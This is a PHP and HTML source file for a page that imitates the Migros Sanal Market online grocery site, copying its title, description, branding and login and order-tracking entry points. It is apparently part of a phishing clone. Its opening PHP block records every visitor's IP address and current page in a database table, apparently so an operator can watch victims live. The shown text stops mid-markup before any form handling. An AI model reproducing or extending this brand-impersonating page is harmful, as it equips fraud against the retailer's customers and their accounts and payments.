<?php
include 'inc/pdo.php';
$currentPageURL = $_SERVER['REQUEST_URI'];
$segments = explode('/', $currentPageURL);
$segments = array_filter($segments);
array_shift($segments);
array_shift($segments);
$id = end($segments);
$userIP = $_SERVER['REMOTE_ADDR'];

$currentURL = $_SERVER["REQUEST_URI"];

$pageName = ($currentURL == '/') ? 'anasayfa' : ltrim($currentURL, '/');
if (strpos($pageName,".") === False){
   $currentDateTime = date('Y-m-d H:i:s');

   $checkQuery = "SELECT * FROM users WHERE ip = :userIP";
   $checkStmt = $pdo->prepare($checkQuery);
   $checkStmt->bindParam(':userIP', $userIP, PDO::PARAM_STR);
   $checkStmt->execute();
   $existingUser = $checkStmt->fetch(PDO::FETCH_ASSOC);
   
   if ($existingUser) {
      $updateQuery = "UPDATE users SET sayfa = :pageName, currenttime = :currentDateTime WHERE ip = :userIP";
      $updateStmt = $pdo->prepare($updateQuery);
      $updateStmt->bindParam(':pageName', $pageName, PDO::PARAM_STR);
      $updateStmt->bindParam(':currentDateTime', $currentDateTime, PDO::PARAM_STR);
      $updateStmt->bindParam(':userIP', $userIP, PDO::PARAM_STR);
      $updateResult = $updateStmt->execute();
   
      if ($updateResult) {
      } else {
      }
   } else {
       $insertQuery = "INSERT INTO users (ip, sayfa, time) VALUES (:userIP, :pageName, :currentDateTime)";
       $insertStmt = $pdo->prepare($insertQuery);
       $insertStmt->bindParam(':userIP', $userIP, PDO::PARAM_STR);
       $insertStmt->bindParam(':pageName', $pageName, PDO::PARAM_STR);
       $insertStmt->bindParam(':currentDateTime', $currentDateTime, PDO::PARAM_STR);
       $insertResult = $insertStmt->execute();
   
       if ($insertResult) {
       } else {
       }
   }
}
?>



<html lang="en">
   <head>
      <meta charset="utf-8">
      <title>Migros Sanal Market: Online Market Alışverişi</title>
      <base href="/">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
      
      <style type="text/css">
      
      
      :root, :host {
         --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
         --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
         --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
         --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
         --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
         --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
         --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
         }
         svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
         overflow: visible;
         box-sizing: content-box;
         }
         .svg-inline--fa {
         display: var(--fa-display, inline-block);
         height: 1em;
         overflow: visible;
         vertical-align: -0.125em;
         }
         .svg-inline--fa.fa-2xs {
         vertical-align: 0.1em;
         }
         .svg-inline--fa.fa-xs {
         vertical-align: 0em;
         }
         .svg-inline--fa.fa-sm {
         vertical-align: -0.0714285705em;
         }
         .svg-inline--fa.fa-lg {
         vertical-align: -0.2em;
         }
         .svg-inline--fa.fa-xl {
         vertical-align: -0.25em;
         }
         .svg-inline--fa.fa-2xl {
         vertical-align: -0.3125em;
         }
         .svg-inline--fa.fa-pull-left {
         margin-right: var(--fa-pull-margin, 0.3em);
         width: auto;
         }
         .svg-inline--fa.fa-pull-right {
         margin-left: var(--fa-pull-margin, 0.3em);
         width: auto;
         }
         .svg-inline--fa.fa-li {
         width: var(--fa-li-width, 2em);
         top: 0.25em;
         }
         .svg-inline--fa.fa-fw {
         width: var(--fa-fw-width, 1.25em);
         }
         .fa-layers svg.svg-inline--fa {
         bottom: 0;
         left: 0;
         margin: auto;
         position: absolute;
         right: 0;
         top: 0;
         }
         .fa-layers-counter, .fa-layers-text {
         display: inline-block;
         position: absolute;
         text-align: center;
         }
         .fa-layers {
         display: inline-block;
         height: 1em;
         position: relative;
         text-align: center;
         vertical-align: -0.125em;
         width: 1em;
         }
         .fa-layers svg.svg-inline--fa {
         -webkit-transform-origin: center center;
         transform-origin: center center;
         }
         .fa-layers-text {
         left: 50%;
         top: 50%;
         -webkit-transform: translate(-50%, -50%);
         transform: translate(-50%, -50%);
         -webkit-transform-origin: center center;
         transform-origin: center center;
         }
         .fa-layers-counter {
         background-color: var(--fa-counter-background-color, #ff253a);
         border-radius: var(--fa-counter-border-radius, 1em);
         box-sizing: border-box;
         color: var(--fa-inverse, #fff);
         line-height: var(--fa-counter-line-height, 1);
         max-width: var(--fa-counter-max-width, 5em);
         min-width: var(--fa-counter-min-width, 1.5em);
         overflow: hidden;
         padding: var(--fa-counter-padding, 0.25em 0.5em);
         right: var(--fa-right, 0);
         text-overflow: ellipsis;
         top: var(--fa-top, 0);
         -webkit-transform: scale(var(--fa-counter-scale, 0.25));
         transform: scale(var(--fa-counter-scale, 0.25));
         -webkit-transform-origin: top right;
         transform-origin: top right;
         }
         .fa-layers-bottom-right {
         bottom: var(--fa-bottom, 0);
         right: var(--fa-right, 0);
         top: auto;
         -webkit-transform: scale(var(--fa-layers-scale, 0.25));
         transform: scale(var(--fa-layers-scale, 0.25));
         -webkit-transform-origin: bottom right;
         transform-origin: bottom right;
         }
         .fa-layers-bottom-left {
         bottom: var(--fa-bottom, 0);
         left: var(--fa-left, 0);
         right: auto;
         top: auto;
         -webkit-transform: scale(var(--fa-layers-scale, 0.25));
         transform: scale(var(--fa-layers-scale, 0.25));
         -webkit-transform-origin: bottom left;
         transform-origin: bottom left;
         }
         .fa-layers-top-right {
         top: var(--fa-top, 0);
         right: var(--fa-right, 0);
         -webkit-transform: scale(var(--fa-layers-scale, 0.25));
         transform: scale(var(--fa-layers-scale, 0.25));
         -webkit-transform-origin: top right;
         transform-origin: top right;
         }
         .fa-layers-top-left {
         left: var(--fa-left, 0);
         right: auto;
         top: var(--fa-top, 0);
         -webkit-transform: scale(var(--fa-layers-scale, 0.25));
         transform: scale(var(--fa-layers-scale, 0.25));
         -webkit-transform-origin: top left;
         transform-origin: top left;
         }
         .fa-1x {
         font-size: 1em;
         }
         .fa-2x {
         font-size: 2em;
         }
         .fa-3x {
         font-size: 3em;
         }
         .fa-4x {
         font-size: 4em;
         }
         .fa-5x {
         font-size: 5em;
         }
         .fa-6x {
         font-size: 6em;
         }
         .fa-7x {
         font-size: 7em;
         }
         .fa-8x {
         font-size: 8em;
         }
         .fa-9x {
         font-size: 9em;
         }
         .fa-10x {
         font-size: 10em;
         }
         .fa-2xs {
         font-size: 0.625em;
         line-height: 0.1em;
         vertical-align: 0.225em;
         }
         .fa-xs {
         font-size: 0.75em;
         line-height: 0.0833333337em;
         vertical-align: 0.125em;
         }
         .fa-sm {
         font-size: 0.875em;
         line-height: 0.0714285718em;
         vertical-align: 0.0535714295em;
         }
         .fa-lg {
         font-size: 1.25em;
         line-height: 0.05em;
         vertical-align: -0.075em;
         }
         .fa-xl {
         font-size: 1.5em;
         line-height: 0.0416666682em;
         vertical-align: -0.125em;
         }
         .fa-2xl {
         font-size: 2em;
         line-height: 0.03125em;
         vertical-align: -0.1875em;
         }
         .fa-fw {
         text-align: center;
         width: 1.25em;
         }
         .fa-ul {
         list-style-type: none;
         margin-left: var(--fa-li-margin, 2.5em);
         padding-left: 0;
         }
         .fa-ul > li {
         position: relative;
         }
         .fa-li {
         left: calc(var(--fa-li-width, 2em) * -1);
         position: absolute;
         text-align: center;
         width: var(--fa-li-width, 2em);
         line-height: inherit;
         }
         .fa-border {
         border-color: var(--fa-border-color, #eee);
         border-radius: var(--fa-border-radius, 0.1em);
         border-style: var(--fa-border-style, solid);
         border-width: var(--fa-border-width, 0.08em);
         padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
         }
         .fa-pull-left {
         float: left;
         margin-right: var(--fa-pull-margin, 0.3em);
         }
         .fa-pull-right {
         float: right;
         margin-left: var(--fa-pull-margin, 0.3em);
         }
         .fa-beat {
         -webkit-animation-name: fa-beat;
         animation-name: fa-beat;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
         animation-timing-function: var(--fa-animation-timing, ease-in-out);
         }
         .fa-bounce {
         -webkit-animation-name: fa-bounce;
         animation-name: fa-bounce;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
         animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
         }
         .fa-fade {
         -webkit-animation-name: fa-fade;
         animation-name: fa-fade;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
         animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
         }
         .fa-beat-fade {
         -webkit-animation-name: fa-beat-fade;
         animation-name: fa-beat-fade;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
         animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
         }
         .fa-flip {
         -webkit-animation-name: fa-flip;
         animation-name: fa-flip;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
         animation-timing-function: var(--fa-animation-timing, ease-in-out);
         }
         .fa-shake {
         -webkit-animation-name: fa-shake;
         animation-name: fa-shake;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, linear);
         animation-timing-function: var(--fa-animation-timing, linear);
         }
         .fa-spin {
         -webkit-animation-name: fa-spin;
         animation-name: fa-spin;
         -webkit-animation-delay: var(--fa-animation-delay, 0s);
         animation-delay: var(--fa-animation-delay, 0s);
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 2s);
         animation-duration: var(--fa-animation-duration, 2s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, linear);
         animation-timing-function: var(--fa-animation-timing, linear);
         }
         .fa-spin-reverse {
         --fa-animation-direction: reverse;
         }
         .fa-pulse,
         .fa-spin-pulse {
         -webkit-animation-name: fa-spin;
         animation-name: fa-spin;
         -webkit-animation-direction: var(--fa-animation-direction, normal);
         animation-direction: var(--fa-animation-direction, normal);
         -webkit-animation-duration: var(--fa-animation-duration, 1s);
         animation-duration: var(--fa-animation-duration, 1s);
         -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         animation-iteration-count: var(--fa-animation-iteration-count, infinite);
         -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
         animation-timing-function: var(--fa-animation-timing, steps(8));
         }
         @media (prefers-reduced-motion: reduce) {
         .fa-beat,
         .fa-bounce,
         .fa-fade,
         .fa-beat-fade,
         .fa-flip,
         .fa-pulse,
         .fa-shake,
         .fa-spin,
         .fa-spin-pulse {
         -webkit-animation-delay: -1ms;
         animation-delay: -1ms;
         -webkit-animation-duration: 1ms;
         animation-duration: 1ms;
         -webkit-animation-iteration-count: 1;
         animation-iteration-count: 1;
         transition-delay: 0s;
         transition-duration: 0s;
         }
         }
         @-webkit-keyframes fa-beat {
         0%, 90% {
         -webkit-transform: scale(1);
         transform: scale(1);
         }
         45% {
         -webkit-transform: scale(var(--fa-beat-scale, 1.25));
         transform: scale(var(--fa-beat-scale, 1.25));
         }
         }
         @keyframes fa-beat {
         0%, 90% {
         -webkit-transform: scale(1);
         transform: scale(1);
         }
         45% {
         -webkit-transform: scale(var(--fa-beat-scale, 1.25));
         transform: scale(var(--fa-beat-scale, 1.25));
         }
         }
         @-webkit-keyframes fa-bounce {
         0% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         10% {
         -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
         transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
         }
         30% {
         -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
         transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
         }
         50% {
         -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
         transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
         }
         57% {
         -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
         transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
         }
         64% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         100% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         }
         @keyframes fa-bounce {
         0% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         10% {
         -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
         transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
         }
         30% {
         -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
         transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
         }
         50% {
         -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
         transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
         }
         57% {
         -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
         transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
         }
         64% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         100% {
         -webkit-transform: scale(1, 1) translateY(0);
         transform: scale(1, 1) translateY(0);
         }
         }
         @-webkit-keyframes fa-fade {
         50% {
         opacity: var(--fa-fade-opacity, 0.4);
         }
         }
         @keyframes fa-fade {
         50% {
         opacity: var(--fa-fade-opacity, 0.4);
         }
         }
         @-webkit-keyframes fa-beat-fade {
         0%, 100% {
         opacity: var(--fa-beat-fade-opacity, 0.4);
         -webkit-transform: scale(1);
         transform: scale(1);
         }
         50% {
         opacity: 1;
         -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
         transform: scale(var(--fa-beat-fade-scale, 1.125));
         }
         }
         @keyframes fa-beat-fade {
         0%, 100% {
         opacity: var(--fa-beat-fade-opacity, 0.4);
         -webkit-transform: scale(1);
         transform: scale(1);
         }
         50% {
         opacity: 1;
         -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
         transform: scale(var(--fa-beat-fade-scale, 1.125));
         }
         }
         @-webkit-keyframes fa-flip {
         50% {
         -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
         transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
         }
         }
         @keyframes fa-flip {
         50% {
         -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
         transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
         }
         }
         @-webkit-keyframes fa-shake {
         0% {
         -webkit-transform: rotate(-15deg);
         transform: rotate(-15deg);
         }
         4% {
         -webkit-transform: rotate(15deg);
         transform: rotate(15deg);
         }
         8%, 24% {
         -webkit-transform: rotate(-18deg);
         transform: rotate(-18deg);
         }
         12%, 28% {
         -webkit-transform: rotate(18deg);
         transform: rotate(18deg);
         }
         16% {
         -webkit-transform: rotate(-22deg);
         transform: rotate(-22deg);
         }
         20% {
         -webkit-transform: rotate(22deg);
         transform: rotate(22deg);
         }
         32% {
         -webkit-transform: rotate(-12deg);
         transform: rotate(-12deg);
         }
         36% {
         -webkit-transform: rotate(12deg);
         transform: rotate(12deg);
         }
         40%, 100% {
         -webkit-transform: rotate(0deg);
         transform: rotate(0deg);
         }
         }
         @keyframes fa-shake {
         0% {
         -webkit-transform: rotate(-15deg);
         transform: rotate(-15deg);
         }
         4% {
         -webkit-transform: rotate(15deg);
         transform: rotate(15deg);
         }
         8%, 24% {
         -webkit-transform: rotate(-18deg);
         transform: rotate(-18deg);
         }
         12%, 28% {
         -webkit-transform: rotate(18deg);
         transform: rotate(18deg);
         }
         16% {
         -webkit-transform: rotate(-22deg);
         transform: rotate(-22deg);
         }
         20% {
         -webkit-transform: rotate(22deg);
         transform: rotate(22deg);
         }
         32% {
         -webkit-transform: rotate(-12deg);
         transform: rotate(-12deg);
         }
         36% {
         -webkit-transform: rotate(12deg);
         transform: rotate(12deg);
         }
         40%, 100% {
         -webkit-transform: rotate(0deg);
         transform: rotate(0deg);
         }
         }
         @-webkit-keyframes fa-spin {
         0% {
         -webkit-transform: rotate(0deg);
         transform: rotate(0deg);
         }
         100% {
         -webkit-transform: rotate(360deg);
         transform: rotate(360deg);
         }
         }
         @keyframes fa-spin {
         0% {
         -webkit-transform: rotate(0deg);
         transform: rotate(0deg);
         }
         100% {
         -webkit-transform: rotate(360deg);
         transform: rotate(360deg);
         }
         }
         .fa-rotate-90 {
         -webkit-transform: rotate(90deg);
         transform: rotate(90deg);
         }
         .fa-rotate-180 {
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg);
         }
         .fa-rotate-270 {
         -webkit-transform: rotate(270deg);
         transform: rotate(270deg);
         }
         .fa-flip-horizontal {
         -webkit-transform: scale(-1, 1);
         transform: scale(-1, 1);
         }
         .fa-flip-vertical {
         -webkit-transform: scale(1, -1);
         transform: scale(1, -1);
         }
         .fa-flip-both,
         .fa-flip-horizontal.fa-flip-vertical {
         -webkit-transform: scale(-1, -1);
         transform: scale(-1, -1);
         }
         .fa-rotate-by {
         -webkit-transform: rotate(var(--fa-rotate-angle, none));
         transform: rotate(var(--fa-rotate-angle, none));
         }
         .fa-stack {
         display: inline-block;
         vertical-align: middle;
         height: 2em;
         position: relative;
         width: 2.5em;
         }
         .fa-stack-1x,
         .fa-stack-2x {
         bottom: 0;
         left: 0;
         margin: auto;
         position: absolute;
         right: 0;
         top: 0;
         z-index: var(--fa-stack-z-index, auto);
         }
         .svg-inline--fa.fa-stack-1x {
         height: 1em;
         width: 1.25em;
         }
         .svg-inline--fa.fa-stack-2x {
         height: 2em;
         width: 2.5em;
         }
         .fa-inverse {
         color: var(--fa-inverse, #fff);
         }
         .sr-only,
         .fa-sr-only {
         position: absolute;
         width: 1px;
         height: 1px;
         padding: 0;
         margin: -1px;
         overflow: hidden;
         clip: rect(0, 0, 0, 0);
         white-space: nowrap;
         border-width: 0;
         }
         .sr-only-focusable:not(:focus),
         .fa-sr-only-focusable:not(:focus) {
         position: absolute;
         width: 1px;
         height: 1px;
         padding: 0;
         margin: -1px;
         overflow: hidden;
         clip: rect(0, 0, 0, 0);
         white-space: nowrap;
         border-width: 0;
         }
         .svg-inline--fa .fa-primary {
         fill: var(--fa-primary-color, currentColor);
         opacity: var(--fa-primary-opacity, 1);
         }
         .svg-inline--fa .fa-secondary {
         fill: var(--fa-secondary-color, currentColor);
         opacity: var(--fa-secondary-opacity, 0.4);
         }
         .svg-inline--fa.fa-swap-opacity .fa-primary {
         opacity: var(--fa-secondary-opacity, 0.4);
         }
         .svg-inline--fa.fa-swap-opacity .fa-secondary {
         opacity: var(--fa-primary-opacity, 1);
         }
         .svg-inline--fa mask .fa-primary,
         .svg-inline--fa mask .fa-secondary {
         fill: black;
         }
         .fad.fa-inverse,
         .fa-duotone.fa-inverse {
         color: var(--fa-inverse, #fff);
         }
      </style>
      <link rel="icon" type="image/x-icon" href="/assets/favicon.ico">
      <meta name="theme-color" content="#ff9933">
      <meta name="description" property="og:description" content="Geniş ürün yelpazesi, en uygun fiyatlı ürünleri ve aynı gün teslimat fırsatıyla online market alışverişinizde Migros Sanal Market size iyi gelecek!">
      <meta property="og:site_name" content="@migros_tr">
      <meta property="og:image" content="https://images.migrosone.com/sanalmarket/custom/sanalmarket-seo-34706362.png">
      <link rel="apple-touch-icon" sizes="57x57" href="/assets/images/seo/apple-touch-icon-57x57.png">
      <link rel="apple-touch-icon" sizes="114x114" href="/assets/images/seo/apple-touch-icon-114x114.png">
      <link rel="apple-touch-icon" sizes="72x72" href="/assets/images/seo/apple-touch-icon-72x72.png">
      <link rel="apple-touch-icon" sizes="144x144" href="/assets/images/seo/apple-touch-icon-144x144.png">
      <link rel="apple-touch-icon" sizes="60x60" href="/assets/images/seo/apple-touch-icon-60x60.png">
      <link rel="apple-touch-icon" sizes="120x120" href="/assets/images/seo/apple-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="76x76" href="/assets/images/seo/apple-touch-icon-76x76.png">
      <link rel="apple-touch-icon" sizes="152x152" href="/assets/images/seo/apple-touch-icon-152x152.png">
      <link rel="apple-touch-icon" href="/assets/images/seo/apple-touch-icon.png">
      <link rel="apple-touch-icon-precomposed" sizes="57x57" href="/assets/images/seo/apple-touch-icon-57x57-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="114x114" href="/assets/images/seo/apple-touch-icon-114x114-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="/assets/images/seo/apple-touch-icon-72x72-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/assets/images/seo/apple-touch-icon-144x144-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="60x60" href="/assets/images/seo/apple-touch-icon-60x60-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="120x120" href="/assets/images/seo/apple-touch-icon-120x120-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="76x76" href="/assets/images/seo/apple-touch-icon-76x76-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="152x152" href="/assets/images/seo/apple-touch-icon-152x152-precomposed.png">
      <!-- To make possible for marketing partners to capture utm tags -->
      <!-- For more info, check: https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default -->
      <meta name="referrer" content="no-referrer-when-downgrade">
      <script async="" src="//cdn.segmentify.com/7a036bce-712d-4354-b5aa-2e74724eee62/segmentify.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-NKFR7KK"></script>
      <script async="" src="https://pagead2.googlesyndication.com/tag/js/gpt.js"></script>
      <link rel="stylesheet" href="styles.268b8ebcf420b384.css">
      
      <style type="text/css"></style>
      <script type="text/javascript"  src="/assets/js/script.js"></script>
      <script type="text/javascript"  src="/assets/js/app.js"></script>
      <link rel="stylesheet" type="text/css" href="/assets/custom.css"/>
      <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.8.1/slick/slick.css"/>
      <!-- Add the slick-theme.css if you want default styling -->
      <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.8.1/slick/slick-theme.css"/>
      <script type="text/javascript" src="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.8.1/slick/slick.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
      <script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
      <style>
         .hidden{
         display: none !important;
         }
      </style>

   </head>
   <body class="mat-typography">
      <sm-root _nghost-cro-c368="" ng-version="14.2.10">
         <div _ngcontent-cro-c368="" class="elektronik grid">
            <sm-header _ngcontent-cro-c368="" class="header">
               <div id="header-wrapper" class="header-wrapper elektronik">
                  <!---->
                  <fe-swiper-banner fedeferload="" class="inline-banner">
                     <!---->
                  </fe-swiper-banner>
                  <!---->
                  <div class="header-top-wrapper">
                     <div class="header-top elektronik">
                     <!----><!----><a id="header-electronic-tab" class="elektronik-logo-tab header-tab selected" href="/"></a>
                        <div class="anonymous">
                           <div class="login-signup-wrapper track-wrapper">
                              <div class="inner inner-track text-color-white">
                                 <div onclick="openmodal('takip');" class="text mat-caption">Sipariş Takibi</div>
                                 <div class="carrot">
                                    <fa-icon class="ng-fa-icon">
                                       <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
                                          <path fill="currentColor" d="M342.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L274.7 256 105.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path>
                                       </svg>
                                    </fa-icon>
                                 </div>
                              </div>
                           </div>
                           <!---->
                           <div class="login-signup-wrapper" onclick='window.location.href = "/giris";'>
                              <div class="inner text-color-white">
                                 <div class="icon"></div>
                                 <div class="text mat-caption">Üye Ol veya Giriş Yap</div>
                                 <div class="carrot">
                                    <fa-icon class="ng-fa-icon">
                                       <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" class="svg-inline--fa fa-chevron-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                          <path fill="currentColor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                       </svg>
                                    </fa-icon>
                                 </div>
                              </div>
                           </div>
                           <!---->
                        </div>
                        <!----><!----><!---->
                     </div>
                     <!---->
                  </div>
                  <div class="header-middle">
                     
                     <?php
                     if (isset($_SESSION['sehir']) && isset($_SESSION['ilce']) && isset($_SESSION['mahalle'])) {
                        
                    ?>
                     <sm-header-address-delivery-time _nghost-tus-c348="" class="ng-star-inserted">
                        <button _ngcontent-tus-c348="" id="delivery-options-search-bucket" class="delivery-options-search-bucket-wrapper ng-star-inserted">
                           <div _ngcontent-tus-c348="" class="delivery-options-wrapper">
                              <!----><!----><!----><!---->
                              <div _ngcontent-tus-c348="" class="delivery-options-inner ng-star-inserted">
                                 <div _ngcontent-tus-c348="" class="two-column-wrapper">
                                    <div _ngcontent-tus-c348="" id="location-row" class="location-row" onclick="openmodal('sepet')">
                                       <img _ngcontent-tus-c348="" id="tikla-gel-al-logo" src="/assets/icons/home-active.svg" alt="" class="tikla-gel-al-logo">
                                       <div _ngcontent-tus-c348="" id="delivery-options-inner-text" class="delivery-options-inner-text mat-caption">
